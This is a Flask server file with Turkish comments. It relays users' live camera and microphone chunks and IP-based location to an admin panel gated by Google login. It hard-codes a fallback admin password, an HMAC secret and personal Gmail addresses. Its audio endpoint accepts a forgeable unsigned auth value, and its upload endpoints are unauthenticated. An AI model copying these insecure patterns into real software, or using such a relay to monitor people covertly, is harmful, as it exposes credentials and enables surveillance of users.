"""Flask web sunucusu — cloud modda çalışır.
   Admin panel + kullanıcı yönetimi."""
import os
import time
import uuid
import hashlib
import hmac
import json
import base64
import threading
from flask import Flask, jsonify, request, render_template
from google.oauth2 import id_token as google_id_token
from google.auth.transport import requests as google_requests

IS_CLOUD = os.environ.get("DEPLOY_MODE") == "cloud"

app = Flask(__name__, template_folder="../templates", static_folder="../static")

# ==================== KONFİGÜRASYON ====================

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "Ag1453ag!")
ADMIN_PASSWORD_HASH = hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest()
GOOGLE_CLIENT_ID = "126230861809-7tlgq66d7jg8b2ljcnkt30qucd61qkt7.apps.googleusercontent.com"
APPROVED_ADMIN_EMAILS = [
    "aydannadya31@gmail.com",
    "infobilgi42@gmail.com",
    "alpgube@gmail.com",
    "alpgube7@gmail.com",
]
ADMIN_TOKEN_SECRET = os.environ.get("ADMIN_TOKEN_SECRET", "guvenli-takip-hmac-secret-2024")

# Bellek içi veri depoları
users_online = {}       # uid -> {email, name, photo_url, last_heartbeat, permissions: {...}}
relay_lock = threading.Lock()
camera_buffers = {}       # uid -> {chunks: [{seq, data, mime, ts}], max_seq: -1}
audio_buffers = {}        # uid -> {chunks: [{seq, data, mime, ts}], max_seq: -1}
incoming_audio = {}       # uid -> {chunks: [{seq, data, mime, ts}], max_seq: -1}

# ==================== YARDIMCI ====================

def make_session_token():
    return uuid.uuid4().hex + uuid.uuid4().hex


def clean_stale_users():
    """30 saniyedir heartbeat göndermeyen kullanıcıları temizle."""
    now = time.time()
    with relay_lock:
        stale = [uid for uid, info in users_online.items()
                 if now - info.get("last_heartbeat", 0) > 30]
        for uid in stale:
            users_online.pop(uid, None)
            camera_buffers.pop(uid, None)
            audio_buffers.pop(uid, None)
            incoming_audio.pop(uid, None)


# ==================== ADMIN TOKEN (HMAC — server-state gerekmez) ====================

def make_admin_token(email, name, photo_url=""):
    payload = base64.urlsafe_b64encode(
        json.dumps({"email": email, "name": name, "photo_url": photo_url, "time": time.time()}).encode()
    ).decode().rstrip("=")
    sig = hmac.new(ADMIN_TOKEN_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
    return payload + "." + sig


def verify_admin_token(token):
    try:
        parts = token.split(".")
        if len(parts) != 2:
            return None
        payload, sig = parts
        expected = hmac.new(ADMIN_TOKEN_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(sig, expected):
            return None
        padded = payload + "=" * (4 - len(payload) % 4) if len(payload) % 4 else payload
        data = json.loads(base64.urlsafe_b64decode(padded.encode()).decode())
        if time.time() - data["time"] > 3600:
            return None
        return data
    except Exception:
        return None


def require_admin(request):
    """Admin session token'ını doğrula."""
    token = request.headers.get("X-Admin-Token", "")
    session = verify_admin_token(token)
    if not session:
        return None
    return session


# ==================== ANA SAYFALAR ====================

@app.route("/")
def index():
    return render_template("login.html")


@app.route("/login")
def login_page():
    return render_template("login.html")


@app.route("/app")
def app_page():
    return render_template("index.html")


@app.route("/admin")
def admin_page():
    return render_template("admin.html")


# ==================== AUTH ENDPOINT'LERİ ====================

@app.route("/api/auth/admin-check", methods=["POST"])
def api_admin_check():
    """Admin şifresini doğrula (ilk aşama)."""
    data = request.get_json() or {}
    given = data.get("password", "")
    given_hash = hashlib.sha256(given.encode()).hexdigest()
    if given_hash == ADMIN_PASSWORD_HASH:
        return jsonify({"status": "ok"})
    return jsonify({"status": "error", "error": "Hatalı şifre"}), 401


@app.route("/api/auth/admin-google-verify", methods=["POST"])
def api_admin_google_verify():
    """Google ID token'ını doğrula, email'i kontrol et, admin session'ı oluştur."""
    data = request.get_json() or {}
    id_token_str = data.get("idToken", "")

    if not id_token_str:
        return jsonify({"status": "error", "error": "Token gerekli"}), 400

    try:
        info = google_id_token.verify_oauth2_token(
            id_token_str, google_requests.Request(), GOOGLE_CLIENT_ID
        )
        email = info.get("email", "").lower().strip()
        name = info.get("name", email.split("@")[0])
        photo = info.get("picture", "")

        if email not in [e.lower().strip() for e in APPROVED_ADMIN_EMAILS]:
            return jsonify({
                "status": "error",
                "error": "Bu email adresi admin yetkisine sahip değil"
            }), 403

        token = make_admin_token(email, name, photo)

        return jsonify({
            "status": "ok",
            "token": token,
            "email": email,
            "name": name,
            "photo_url": photo,
        })

    except Exception as e:
        return jsonify({"status": "error", "error": f"Token doğrulama hatası: {str(e)}"}), 401


# ==================== RELAY — KULLANICI VERİ GÖNDERME ====================

@app.route("/api/relay/heartbeat", methods=["POST"])
def api_relay_heartbeat():
    """Kullanıcıdan heartbeat + izin durumu."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    email = data.get("email", "")
    name = data.get("name", "")
    photo = data.get("photo_url", "")

    if not uid:
        return jsonify({"status": "error", "error": "uid gerekli"}), 400

    with relay_lock:
        if uid not in users_online:
            users_online[uid] = {"email": email, "name": name, "photo_url": photo}
        users_online[uid]["last_heartbeat"] = time.time()

    clean_stale_users()
    return jsonify({"status": "ok"})


@app.route("/api/relay/camera-chunk", methods=["POST"])
def api_relay_camera_chunk():
    """Kullanıcıdan kamera chunk'ını al, geçici buffer'a koy."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    chunk_b64 = data.get("chunk", "")
    seq = data.get("sequence", 0)
    mime = data.get("mimeType", "video/webm")

    if not uid or not chunk_b64:
        return jsonify({"status": "error", "error": "eksik veri"}), 400

    with relay_lock:
        if uid not in camera_buffers:
            camera_buffers[uid] = {"chunks": [], "max_seq": -1}
        buf = camera_buffers[uid]
        buf["chunks"].append({
            "seq": seq, "data": chunk_b64,
            "mime": mime, "ts": time.time()
        })
        buf["max_seq"] = max(buf["max_seq"], seq)
        if len(buf["chunks"]) > 10:
            buf["chunks"] = buf["chunks"][-10:]

    return jsonify({"status": "ok", "seq": seq})


@app.route("/api/relay/audio-chunk", methods=["POST"])
def api_relay_audio_chunk():
    """Kullanıcıdan mikrofon chunk'ını al, bellekte tut."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    chunk_b64 = data.get("chunk", "")
    seq = data.get("sequence", 0)
    mime = data.get("mimeType", "audio/webm")

    if not uid or not chunk_b64:
        return jsonify({"status": "error", "error": "eksik veri"}), 400

    with relay_lock:
        if uid not in audio_buffers:
            audio_buffers[uid] = {"chunks": [], "max_seq": -1}
        buf = audio_buffers[uid]
        buf["chunks"].append({
            "seq": seq, "data": chunk_b64,
            "mime": mime, "ts": time.time()
        })
        buf["max_seq"] = max(buf["max_seq"], seq)
        if len(buf["chunks"]) > 30:
            buf["chunks"] = buf["chunks"][-30:]

    return jsonify({"status": "ok", "seq": seq})


@app.route("/api/relay/incoming-audio/<uid>")
def api_relay_incoming_audio(uid):
    """Kullanıcı admin'den gelen ses mesajlarını çeker (polling)."""
    auth = request.args.get("auth", "")
    try:
        auth_data = json.loads(base64.b64decode(auth.encode()).decode())
        if not auth_data.get("uid") or auth_data.get("uid") != uid:
            return jsonify({"status": "error", "error": "Yetkisiz"}), 401
    except Exception:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    after_seq = request.args.get("after", -1, type=int)

    with relay_lock:
        buf = incoming_audio.get(uid, {"chunks": [], "max_seq": -1})
        if after_seq >= 0:
            new_chunks = [c for c in buf["chunks"] if c["seq"] > after_seq]
        else:
            new_chunks = list(buf["chunks"])

    return jsonify({
        "status": "ok",
        "chunks": new_chunks,
        "max_seq": buf["max_seq"]
    })


# ==================== ADMIN — KULLANICI VERİSİNİ ÇEKME ====================

@app.route("/api/admin/users")
def api_admin_users():
    """Admin için çevrimiçi kullanıcı listesi."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    clean_stale_users()
    now = time.time()
    user_list = []
    with relay_lock:
        for uid, info in users_online.items():
            is_active = (now - info.get("last_heartbeat", 0)) < 15
            user_list.append({
                "uid": uid,
                "email": info.get("email", ""),
                "name": info.get("name", ""),
                "photo_url": info.get("photo_url", ""),
                "is_active": is_active,
                "last_seen": info.get("last_heartbeat", 0),
            })
    return jsonify({"status": "ok", "users": user_list, "admin": session})


@app.route("/api/admin/user/<uid>")
def api_admin_user(uid):
    """Admin için tek kullanıcının bilgisi."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    clean_stale_users()
    with relay_lock:
        user_info = users_online.get(uid)
        is_active = user_info and (time.time() - user_info.get("last_heartbeat", 0)) < 15

    return jsonify({
        "status": "ok",
        "user": user_info,
        "relay": {},
        "is_active": bool(is_active),
    })


@app.route("/api/admin/camera-stream/<uid>")
def api_admin_camera_stream(uid):
    """Admin için kullanıcının kamera chunk'larını döndür (polling)."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    after_seq = request.args.get("after", -1, type=int)

    with relay_lock:
        buf = camera_buffers.get(uid, {"chunks": [], "max_seq": -1})
        if after_seq >= 0:
            new_chunks = [c for c in buf["chunks"] if c["seq"] > after_seq]
        else:
            new_chunks = list(buf["chunks"])

    return jsonify({
        "status": "ok",
        "chunks": new_chunks,
        "max_seq": buf["max_seq"],
        "is_live": bool(new_chunks)
    })


@app.route("/api/admin/audio-feed/<uid>")
def api_admin_audio_feed(uid):
    """Admin için kullanıcının mikrofon chunk'larını döndür (polling)."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    after_seq = request.args.get("after", -1, type=int)

    with relay_lock:
        buf = audio_buffers.get(uid, {"chunks": [], "max_seq": -1})
        if after_seq >= 0:
            new_chunks = [c for c in buf["chunks"] if c["seq"] > after_seq]
        else:
            new_chunks = list(buf["chunks"])

    return jsonify({
        "status": "ok",
        "chunks": new_chunks,
        "max_seq": buf["max_seq"],
        "is_live": bool(new_chunks)
    })


@app.route("/api/admin/send-audio/<uid>", methods=["POST"])
def api_admin_send_audio(uid):
    """Admin kullanıcıya ses mesajı gönderir."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    data = request.get_json() or {}
    chunk_b64 = data.get("chunk", "")
    mime = data.get("mimeType", "audio/webm")

    if not chunk_b64:
        return jsonify({"status": "error", "error": "eksik veri"}), 400

    with relay_lock:
        if uid not in incoming_audio:
            incoming_audio[uid] = {"chunks": [], "max_seq": -1}
        buf = incoming_audio[uid]
        seq = buf["max_seq"] + 1
        buf["chunks"].append({
            "seq": seq, "data": chunk_b64,
            "mime": mime, "ts": time.time()
        })
        buf["max_seq"] = seq
        if len(buf["chunks"]) > 20:
            buf["chunks"] = buf["chunks"][-20:]

    return jsonify({"status": "ok", "seq": seq})


# ==================== IP KONUM API ====================

@app.route("/api/ip-location")
def api_ip_location():
    try:
        import requests as http_req
        if IS_CLOUD:
            client_ip = request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        else:
            client_ip = request.remote_addr or "8.8.8.8"
        if not client_ip or client_ip in ("127.0.0.1", "::1", ""):
            ip_resp = http_req.get("https://api.ipify.org?format=json", timeout=5)
            client_ip = ip_resp.json().get("ip", "8.8.8.8")
        resp = http_req.get(
            f"http://ip-api.com/json/{client_ip}?fields=status,country,countryCode,region,city,zip,lat,lon,isp,timezone,query,org",
            timeout=5
        )
        data = resp.json()
        if data.get("status") != "success":
            return jsonify({"status": "error", "error": "Konum bilgisi alınamadı"})
        return jsonify({"status": "ok", "source": "ip", "ip": data.get("query"),
            "country": data.get("country"), "country_code": data.get("countryCode"),
            "region": data.get("region"), "city": data.get("city"),
            "postal": data.get("zip"), "latitude": data.get("lat"),
            "longitude": data.get("lon"), "isp": data.get("isp"),
            "org": data.get("org"), "timezone": data.get("timezone"),})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)})
